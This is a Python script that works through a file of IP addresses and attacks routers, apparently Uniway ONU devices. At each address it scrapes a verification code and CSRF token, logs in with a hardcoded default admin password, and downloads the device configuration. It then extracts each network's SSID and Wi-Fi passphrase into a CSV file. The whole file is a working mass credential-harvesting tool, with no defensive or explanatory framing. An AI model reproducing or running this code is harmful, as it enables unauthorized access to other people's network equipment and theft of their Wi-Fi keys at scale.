import os
import requests
import re
import csv
import xml.etree.ElementTree as ET


def send_login_request(ip, code, csrf):
    link = f"http://{ip}/boaform/admin/formLogin"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip}/admin/login.asp",
        "Upgrade-Insecure-Requests": "1",
    }
    data = {
        "username1": "admin",
        "psd1": "stdONUioi",
        "verification_code": code,
        "loginSelinit": "0",
        "username": "admin",
        "psd": "stdONUioi",
        "sec_lang": "0",
        "csrftoken": csrf,
    }

    resp = requests.post(link, headers=headers, data=data)
    if resp.status_code == 200:
        print(f"Login request sent successfully to {ip}")
    else:
        print(f"Failed to send login request to {ip}")


def download_request(ip, csrf):
    link = f"http://{ip}/boaform/admin/formMgmConfig"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Origin": f"http://{ip}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip}/mgm_config_file.asp",
        "Upgrade-Insecure-Requests": "1",
    }

    data = {"action": "saveconfigfile", "submit-url": "", "csrftoken": csrf}

    resp = requests.post(link, headers=headers, data=data)
    if resp.status_code == 200:
        filename = f"{ip}.xml"
        folder_path = "uniway_xml"
        os.makedirs(folder_path, exist_ok=True)
        file_path = os.path.join(folder_path, filename)
        with open(file_path, "wb") as config:
            config.write(resp.content)
        print(f"Downloaded file saved: {file_path}")
    else:
        print(f"Failed to send download request to {ip}")


def send_logout(ip):
    link = f"http://{ip}/boaform/admin/formLogout"
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate",
        "Content-Type": "application/x-www-form-urlencoded",
        "Content-Length": "42",
        "Origin": f"http://{ip}",
        "Connection": "keep-alive",
        "Referer": f"http://{ip}/top.asp",
        "Upgrade-Insecure-Requests": "1",
    }
    data = {}

    resp = requests.post(link, headers=headers, data=data)
    print(resp)
    if resp.status_code == 200:
        print("Logout successful")
    else:
        print("Failed to logout")


def parse_xml_files(directory):
    """Parses XML files in the specified directory and extracts SSID and KeyPassphrase pairs."""
    ssid_key_pairs = []

    # Iterate over all files in the directory
    for filename in os.listdir(directory):
        if filename.endswith(".xml"):
            ip = filename.replace(".xml", "")
            file_path = os.path.join(directory, filename)

            try:
                # Parse the XML file
                tree = ET.parse(file_path)
                root = tree.getroot()

                # Find the SSID and KeyPassphrase elements
                ssid_element = root.find(".//Value[@Name='SSID']")
                keypassphrase_element = root.find(".//Value[@Name='WSC_PSK']")

                # Extract the values if elements are found
                if ssid_element is not None and keypassphrase_element is not None:
                    ssid = ssid_element.attrib["Value"]
                    keypassphrase = keypassphrase_element.attrib["Value"]

                    ssid_key_pairs.append((ip, ssid, keypassphrase))
            except ET.ParseError:
                print(f"Failed to parse XML file: {file_path}")

    return ssid_key_pairs


def save_to_csv(pairs, output_file):
    """Saves the specified pairs to a CSV file."""
    with open(output_file, "w", newline="") as file:
        writer = csv.writer(file)
        writer.writerow(["IP", "SSID", "KeyPassphrase"])  # Write header

        for ip, ssid, keypassphrase in pairs:
            writer.writerow([ip, ssid, keypassphrase])


with open("uniway.txt", "r") as file:
    ip_list = file.readlines()

for ip_index, ip in enumerate(ip_list):
    ip = ip.strip()

    url = f"http://{ip}"
    response = requests.get(url)
    check_code_match = re.search(
        r"document\.getElementById\('check_code'\)\.value='([^']*)';", response.text
    )
    check_code_value = check_code_match.group(1) if check_code_match else None
    csrf_token_match = re.search(
        r"<input type='hidden' name='csrftoken' value='([^']*)' />", response.text
    )
    csrf_token_value = csrf_token_match.group(1) if csrf_token_match else None
    send_login_request(ip, check_code_value, csrf_token_value)
    download_request(ip, csrf_token_value)

#     # For Debugging - Disabled by default
#     # send_logout(ip)

directory_path = "uniway_xml"
output_file = "uniway.csv"
pairs = parse_xml_files(directory_path)
save_to_csv(pairs, output_file)
